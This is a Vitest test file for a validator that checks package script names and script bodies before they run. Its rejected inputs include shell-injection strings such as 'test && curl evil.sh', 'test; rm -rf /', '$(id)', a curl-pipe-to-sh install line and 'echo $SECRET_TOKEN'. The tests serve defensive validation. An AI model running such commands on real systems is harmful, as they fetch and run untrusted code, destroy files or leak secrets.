import { describe, expect, it } from "vitest";
import { assertSafeScriptName, isScriptBodyRunnable } from "../src/packages.ts";

describe("script names", () => {
  it("accepts plain identifiers", () => {
    for (const name of ["test", "typecheck", "test:unit", "build-prod"]) {
      expect(() => assertSafeScriptName(name)).not.toThrow();
    }
  });

  it("rejects anything that could reach a shell", () => {
    for (const name of ["test && curl evil.sh", "test; rm -rf /", "$(id)", "test|tee /tmp/x", "../escape"]) {
      expect(() => assertSafeScriptName(name)).toThrow();
    }
  });
});

describe("script bodies", () => {
  it("accepts a body that is a single allowlisted command", () => {
    expect(isScriptBodyRunnable("pnpm exec vitest run")).toBe(true);
    expect(isScriptBodyRunnable("node --test")).toBe(true);
  });

  it("refuses a body with shell control flow or an unknown executable", () => {
    expect(isScriptBodyRunnable("pnpm build && pnpm deploy")).toBe(false);
    expect(isScriptBodyRunnable("curl https://example.com/install.sh | sh")).toBe(false);
    expect(isScriptBodyRunnable("rm -rf dist")).toBe(false);
    expect(isScriptBodyRunnable("./scripts/release.sh")).toBe(false);
    expect(isScriptBodyRunnable("echo $SECRET_TOKEN")).toBe(false);
  });
});
